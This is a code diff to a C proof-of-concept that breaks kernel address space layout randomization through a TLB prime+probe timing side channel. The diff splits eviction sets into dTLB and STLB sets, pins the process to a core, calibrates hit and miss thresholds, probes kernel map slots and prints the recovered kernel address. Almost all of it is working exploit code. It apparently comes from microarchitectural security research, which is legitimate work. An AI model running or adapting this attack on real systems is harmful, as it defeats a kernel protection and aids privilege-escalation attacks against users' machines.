@@ -1,8 +1,9 @@
+#define _GNU_SOURCE
 #include "config.h"
 #include "memory.h"
-#include "timing.h"
 #include <errno.h>
 #include <pwd.h>
+#include <sched.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/stat.h>
@@ -10,8 +11,7 @@
 #include <time.h>
 #include <unistd.h>
 
-uint64_t timer_overhead;
-char *eset_data;
+#define CALIBRATION_ITERS 100000
 
 uint64_t *res;
 
@@ -27,42 +27,51 @@ int leak_val(void *addr) {
 }
 
 void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
-  void *eset[ESET_SIZE];
+  void *eset_dtlb[DTLB_EVSET_SIZE_4K];
+  void *eset_stlb[STLB_EVSET_SIZE_4K];
   register uint64_t tmp;
 
-  gen_eset(&eset_data[0], eset, &eset_data[0]);
+  char *test_addr;
+  posix_memalign(&test_addr, PAGE_SIZE, PAGE_SIZE);
+  *test_addr = 1;
+  gen_eset(test_addr, eset_stlb, eset_dtlb);
 
   tmp = 0;
-  for (int i = 0; i < 100000; i++) {
-    prime(eset);
-    memory_access(&eset_data[0]);
-    tmp += probe(eset);
+  for (int i = 0; i < CALIBRATION_ITERS; i++) {
+    prime(eset_stlb);
+    maccess(test_addr);
+    tmp += probe(eset_stlb);
   }
 
-  *valid_cycle = tmp / 100000;
+  *valid_cycle = tmp / CALIBRATION_ITERS;
 
   tmp = 0;
-  for (int i = 0; i < 100000; i++) {
-    prime(eset);
+  for (int i = 0; i < CALIBRATION_ITERS; i++) {
+    prime(eset_stlb);
     memory_fence();
-    tmp += probe(eset);
+    tmp += probe(eset_stlb);
   }
-  *invalid_cycle = tmp / 100000;
+  *invalid_cycle = tmp / CALIBRATION_ITERS;
 }
 
 int main(int argc, char *argv[]) {
   void *addr;
-  void *eset[ESET_SIZE];
+  void *eset_dtlb[DTLB_EVSET_SIZE_4K];
+  void *eset_stlb[STLB_EVSET_SIZE_4K];
   void *target[TRAINING_ITERS] = {user, user, user, user, user, user};
   uint64_t valid_cycle, invalid_cycle;
   struct timeval tv_s, tv_e;
   register uint64_t tmp, threshold;
 
-  eset_data = (void *)malloc(sizeof(char) * ESET_OFFSET * 0x4000);
   res = (uint64_t *)malloc(sizeof(uint64_t) * 10000000);
 
-  // start_timer();
-  timer_overhead = get_timer_overhead();
+  pin_to_core(0);
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+
+  init_tlb_flush();
 
   get_cycle(&valid_cycle, &invalid_cycle);
   threshold = invalid_cycle + (valid_cycle - invalid_cycle) / 3;
@@ -83,13 +92,13 @@ int main(int argc, char *argv[]) {
       idx = (s_idx * 73) % NUM_SLOT;
       addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
       target[TRAINING_ITERS - 1] = addr;
-      gen_eset(addr, eset, &eset_data[0]);
+      gen_eset(addr, eset_dtlb, eset_stlb);
       do {
         for (int j = 0; j < TRAINING_ITERS; j++) {
-          prime(eset);
+          prime(eset_stlb);
           leak_val(target[j]);
         }
-        tmp = probe(eset);
+        tmp = probe(eset_stlb);
       } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
       res[idx] += tmp;
     }
@@ -149,6 +158,5 @@ int main(int argc, char *argv[]) {
   printf("kernel map addr\t= \033[1;31m0x%llx\033[0m\n", kernel_map_addr);
   printf("Time to break KASLR\t= %.2fs\n", diff);
   printf("==============================================\n");
-  //stop_timer();
   return 0;
 }
